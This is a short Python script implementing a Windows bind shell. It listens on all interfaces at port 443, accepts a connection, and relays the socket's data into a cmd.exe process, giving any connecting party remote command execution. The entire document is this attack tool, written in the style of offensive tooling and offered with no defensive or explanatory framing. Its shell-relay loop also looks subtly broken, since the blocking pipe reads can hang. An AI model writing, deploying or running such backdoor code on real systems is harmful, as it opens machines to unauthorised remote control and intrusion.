import socket
import subprocess

def start_listener(host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the specified host and port
    s.bind((host, port))

    # Listen for incoming connections
    s.listen(1)

    print(f"[+] Listening for connections on {host}:{port}")

    # Accept an incoming connection
    conn, addr = s.accept()

    print(f"[+] Accepted connection from {addr[0]}:{addr[1]}")

    # Create a new process for the shell
    shell = subprocess.Popen(["cmd.exe", "/c", "cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # Send and receive data between the socket and the shell process
    while True:
        try:
            data = conn.recv(1024)
            if len(data) == 0:
                break

            shell.stdin.write(data)
            shell.stdin.flush()

            output = shell.stdout.read(1024)
            conn.sendall(output)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    # Close the connection and the shell process
    conn.close()
    shell.terminate()

# Specify the host and port for the listener
host = "0.0.0.0"
port = 443

# Start the listener
start_listener(host, port)
